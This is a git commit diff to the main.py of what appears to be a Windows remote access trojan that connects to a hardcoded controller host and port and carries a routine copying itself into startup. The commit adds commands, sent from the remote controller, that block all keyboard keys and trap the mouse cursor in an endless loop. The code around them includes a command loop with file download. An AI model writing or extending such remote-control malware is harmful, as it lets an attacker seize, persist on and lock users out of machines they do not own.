3d1a1ab9fd8d8c0aefdf59ad4ea0de0ff65a2214
Hidden Name <phyrocycle.moscow@gmail.com>
2021-10-28 20:23:46 +0300

    Mouse and keyboard blocking was added

--- main.py
+++ main.py
@@ -1,10 +1,13 @@
 from shutil import copyfile
 import subprocess
+import keyboard
 import ctypes
 import requests
 import socket
 import os
 import sys
+import threading
+import mouse
 import time
 
 key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
@@ -14,6 +17,11 @@ host = '192.168.1.71'
 port = 3142
 
 program_name = 'main.exe'
+
+global mouse_blocking
+mouse_blocking = False
+
+keyboard_blocking = False
 
 
 def connect():
@@ -69,14 +77,40 @@ def add_to_startup():
     if not os.path.isfile(working_dir):
         copyfile(os.getcwd() + f'\\{program_name}', working_dir)
         print('Program was added to startup')
-        ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
         subprocess.Popen([working_dir])
+        ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
         sys.exit()
     else:
         print('Program have already added in startup')
 
 
-add_to_startup()
+def block_keyboard():
+    for i in range(110):
+        keyboard.block_key(i)
+    return 'OK'
+
+
+def unblock_keyboard():
+    for i in range(110):
+        keyboard.unblock_key(i)
+    return 'OK'
+
+
+def block_mouse():
+    # until mouse_blocking is False, move mouse to (1,0)
+    global mouse_blocking
+    mouse_blocking = True
+    while mouse_blocking:
+        mouse.move(10000, 10000, absolute=True, duration=0)
+
+
+def unblock_mouse():
+    # stops infinite control of mouse after 10 seconds if program fails to execute
+    global mouse_blocking
+    mouse_blocking = False
+
+
+# add_to_startup()
 
 while True:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,6 +135,36 @@ while True:
                     send('Specify the filename')
                 else:
                     send(download_file(params[0], params[1]))
+            elif command.startswith('keyboard'):
+                if 'unblock' in command:
+                    if keyboard_blocking:
+                        keyboard_blocking = False
+                        send(unblock_keyboard())
+                    else:
+                        send("Keyboard isn't blocking")
+                elif 'block' in command:
+                    if keyboard_blocking:
+                        send('Keyboard was already blocked')
+                    else:
+                        keyboard_blocking = True
+                        send(block_keyboard())
+                else:
+                    send('Specify the action')
+            elif command.startswith('mouse'):
+                if 'unblock' in command:
+                    if mouse_blocking:
+                        threading.Thread(target=unblock_mouse).start()
+                        send('OK')
+                    else:
+                        send("Mouse isn't blocking")
+                elif 'block' in command:
+                    if mouse_blocking:
+                        send('Mouse was already blocked')
+                    else:
+                        threading.Thread(target=block_mouse).start()
+                        send('OK')
+                else:
+                    send('Specify the action')
             elif command == 'ping':
                 send('pong')
             else:
